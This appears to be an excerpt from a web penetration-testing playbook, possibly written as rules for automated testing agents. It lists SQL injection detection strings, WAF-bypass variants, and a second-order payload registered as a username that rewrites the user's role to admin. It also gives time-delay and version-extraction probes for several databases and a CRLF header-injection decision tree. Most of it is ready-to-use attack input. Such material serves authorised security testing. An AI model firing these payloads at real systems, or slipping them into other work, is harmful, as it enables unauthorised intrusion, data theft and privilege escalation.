...
### Detection (all contexts: query, JSON body, GraphQL variables, cookies, headers)
```
' OR '1'='1
" OR "1"="1
' OR 1=1--
...
### WAF bypass (stack with rules/waf-bypass-protocol.md)
```
'/**/OR/**/1=1--
'%09OR%091=1--
' UnIoN SeLeCt NULL--
...
1. Register username: `admin'--` or `'; UPDATE users SET role='admin' WHERE id=YOUR_ID--`
2. Trigger in report export, admin panel search, audit log viewer

### Read-back proof (Rule 23)
- Boolean: `AND 1=1` vs `AND 1=2` response diff
- Time: baseline 3x median latency + `SLEEP(5)` delta >4s
- Union: extract `version()` or `current_user` in response body
- Never report on single 500 error without reproducible data extraction
...
| MSSQL | `WAITFOR DELAY '0:0:5'` | `@@version` |
| Oracle | `DBMS_PIPE.RECEIVE_MESSAGE('a',5)` | `banner FROM v$version` |
| SQLite | heavy query | `sqlite_version()` |
...
### Surface probe D decision tree (gate class `header-injection`)

1. Inject CRLF into every redirect param, filename, and `Host` / `X-Forwarded-Host`.
2. **Set-Cookie reflected** → session fixation chain → auth-tester.
3. **Location header split** → open-redirect hunter.
4. **Body after `\r\n\r\n`** → xss-hunter (stored/reflected context).
5. No reflection in `Set-Cookie`/`Location`/body after full UTF-8/overlong matrix → `not-applicable` with probe D artifact.
